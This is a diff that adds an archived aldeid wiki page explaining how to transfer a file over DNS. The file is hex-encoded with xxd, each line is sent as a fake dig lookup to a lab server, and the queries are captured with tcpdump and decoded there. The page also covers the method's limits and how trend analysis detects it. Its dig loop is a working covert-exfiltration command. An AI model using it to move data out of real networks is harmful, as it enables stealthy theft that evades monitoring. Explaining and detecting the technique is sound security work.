@@ -1,0 +1,94 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>File-transfer-via-DNS - aldeid</title>
+<link rel="stylesheet" href="../css/article.css" />
+</head>
+<body>
+<div class="m-content">
+<h1>File-transfer-via-DNS - aldeid</h1>
+<div id="mw-content-text" lang="en" dir="ltr"><p>You guys already know DNS encapsulation (e.g. <a href="/wiki/Dns2tcp" title="Dns2tcp">dns2tcp</a>) to transfer data over DNS but I've found a very interesting post from <a rel="nofollow" target="_blank" href="https://plus.google.com/101587262224166552564/posts">Johannes Ullrich</a> who introduces a relatively stealthy concept (<a rel="nofollow" target="_blank" href="https://isc.sans.edu/diary/Packet+Tricks+with+xxd/10306">https://isc.sans.edu/diary/Packet+Tricks+with+xxd/10306</a>) to transfer data via DNS requests. It consists of sending hex parts of a file as part of DNS requests on one side and to capture and split these DNS requests on the other side. No specific tool is required but tcpdump and xxd.
+</p><ul>
+<li>Client: 192.168.1.29
+</li>
+<li>Server: 192.168.1.23, running bind9 DNS server
+</li>
+</ul><h2><span id="Encode_file">Encode file</span></h2><p>On the client side, prepare a plain text file:
+</p><pre>client$ <b>cat &gt; loremipsum.txt &lt;&lt; EOF</b>
+&gt; <b>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod</b>
+&gt; <b>tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</b>
+&gt; <b>quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo</b>
+&gt; <b>consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse</b>
+&gt; <b>cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat</b>
+&gt; <b>non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</b>
+&gt; <b>EOF</b>
+</pre><p>Then, encode your file in Hex:
+</p><pre>client$ <b>xxd -p loremipsum.txt &gt; loremipsum.hex</b>
+</pre><h2><span id="Transfer_file">Transfer file</span></h2><p>On the server, start a tcpdump probe that will capture all DNS requests from your client:
+</p><pre>server$ <b>sudo tcpdump -i eth1 -s0 -w loremipsum.pcap 'port 53 and host 192.168.1.29' </b>
+</pre><p>On the client, send each line as a fake DNS request:
+</p><pre>client$ <b>for b in `cat loremipsum.hex`; do dig @192.168.1.23 $b.fakednsrequest.com; done</b>
+</pre><p>Once all requests have been requested by the client, stop the capture. Here is how the requests look like:
+</p><pre>server$ <b>tcpdump -n -r loremipsum.pcap 'host 192.168.1.29 and host 192.168.1.23' | grep fakednsrequest</b>
+12:08:58.329214 IP 192.168.1.29.54172 &gt; 192.168.1.23.53: 39667+ A? 4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f.fakednsrequest.com. (97)
+12:08:59.348640 IP 192.168.1.29.54251 &gt; 192.168.1.23.53: 45714+ A? 6e7365637465747572206164697069736963696e6720656c69742c207365.fakednsrequest.com. (97)
+12:08:59.435167 IP 192.168.1.29.61604 &gt; 192.168.1.23.53: 65328+ A? 6420646f20656975736d6f640a74656d706f7220696e6369646964756e74.fakednsrequest.com. (97)
+12:08:59.638909 IP 192.168.1.29.60176 &gt; 192.168.1.23.53: 33114+ A? 207574206c61626f726520657420646f6c6f7265206d61676e6120616c69.fakednsrequest.com. (97)
+12:08:59.715597 IP 192.168.1.29.53987 &gt; 192.168.1.23.53: 24783+ A? 7175612e20557420656e696d206164206d696e696d2076656e69616d2c0a.fakednsrequest.com. (97)
+12:08:59.766398 IP 192.168.1.29.53719 &gt; 192.168.1.23.53: 4470+ A? 71756973206e6f737472756420657865726369746174696f6e20756c6c61.fakednsrequest.com. (97)
+12:09:00.632051 IP 192.168.1.29.52365 &gt; 192.168.1.23.53: 61980+ A? 6d636f206c61626f726973206e69736920757420616c6971756970206578.fakednsrequest.com. (97)
+12:09:00.709879 IP 192.168.1.29.51128 &gt; 192.168.1.23.53: 53988+ A? 20656120636f6d6d6f646f0a636f6e7365717561742e2044756973206175.fakednsrequest.com. (97)
+12:09:00.755917 IP 192.168.1.29.59786 &gt; 192.168.1.23.53: 30998+ A? 746520697275726520646f6c6f7220696e20726570726568656e64657269.fakednsrequest.com. (97)
+12:09:00.816321 IP 192.168.1.29.61625 &gt; 192.168.1.23.53: 46229+ A? 7420696e20766f6c7570746174652076656c697420657373650a63696c6c.fakednsrequest.com. (97)
+12:09:00.862252 IP 192.168.1.29.63196 &gt; 192.168.1.23.53: 27593+ A? 756d20646f6c6f726520657520667567696174206e756c6c612070617269.fakednsrequest.com. (97)
+12:09:00.918015 IP 192.168.1.29.52375 &gt; 192.168.1.23.53: 42492+ A? 617475722e204578636570746575722073696e74206f6363616563617420.fakednsrequest.com. (97)
+12:09:01.057845 IP 192.168.1.29.55582 &gt; 192.168.1.23.53: 44245+ A? 6375706964617461740a6e6f6e2070726f6964656e742c2073756e742069.fakednsrequest.com. (97)
+12:09:01.105330 IP 192.168.1.29.56880 &gt; 192.168.1.23.53: 17982+ A? 6e2063756c706120717569206f666669636961206465736572756e74206d.fakednsrequest.com. (97)
+12:09:01.162269 IP 192.168.1.29.59910 &gt; 192.168.1.23.53: 19163+ A? 6f6c6c697420616e696d20696420657374206c61626f72756d2e0a.fakednsrequest.com. (91)
+</pre><h2><span id="Decode_file">Decode file</span></h2><p>Use a combination of cut commands to extract the hex part:
+</p><pre>server$ <b>tcpdump -n -r loremipsum.pcap 'host 192.168.1.29 and host 192.168.1.23' | grep fakednsrequest \</b>
+ <b>| cut -d ' ' -f 8 | cut -d '.' -f 1 | uniq &gt; loremipsum.hex</b>
+</pre><p>Now let's decode our file:
+</p><pre>$ <b>xxd -r -p &lt; loremipsum.hex</b>
+Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
+tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
+consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
+cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat
+non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
+</pre><p>This method is relatively stealthy because:
+</p><ul>
+<li>there is no encapsulation of the data;
+</li>
+<li>DNS requests seem legitimate.
+</li>
+</ul><p>However:
+</p><ul>
+<li>the content to transfer is twice the size of the initial file;
+</li>
+<li>it can become relatively visible because the frequency of the requests can become suspicious;
+</li>
+<li>depending on the size of the file to transfer, it can take a significant amount of time;
+</li>
+<li>unless the file is encrypted before being hex'ed, one could intercept the requests and rebuild the file;
+</li>
+<li>Big file transfers can result in corrupted files (UDP).
+</li>
+</ul><p>As a matter of fact, the transfer of an initial 15K file (an image) will require 500 DNS requests
+</p><pre>$ <b>ls -lh aldeid.png </b>
+-rw-r--r--@ 1 sebastiendamaye  staff    15K 16 fév 12:38 aldeid.png
+$ <b>xxd -p aldeid.png | wc -l</b>
+    501
+</pre><p>and an initial 23M file will require 792K+ requests:
+</p><pre>$ <b>ls -lh tintin.*</b>
+-rw-r--r--  1 sebastiendamaye  staff    46M 16 fév 13:00 tintin.hex
+-rw-r--r--@ 1 sebastiendamaye  staff    23M 16 fév 13:00 tintin.pdf
+$ <b>wc -l tintin.hex </b>
+  792903 tintin.hex
+</pre><p>Though it could be possible to identify such traffic with Snort rules, the most obvious way in this case relies on a trend analysis (i.e. ntop) to identify anomalies:
+</p><p><a href="/wiki/File:Trend-analysis-dns-ntop.png"><img alt="Trend-analysis-dns-ntop.png" src="/w/images/5/54/Trend-analysis-dns-ntop.png" width="609" height="271" /></a>
+</p><noscript><a href="http://aldeid.disqus.com/?url=ref">View the discussion thread.</a></noscript><a href="http://disqus.com">blog comments powered by </a></div></div>
+<script>var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-34802167-1']); _gaq.push(['_setDomainName', 'liuzhe.co']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })();</script></body>
+</html>
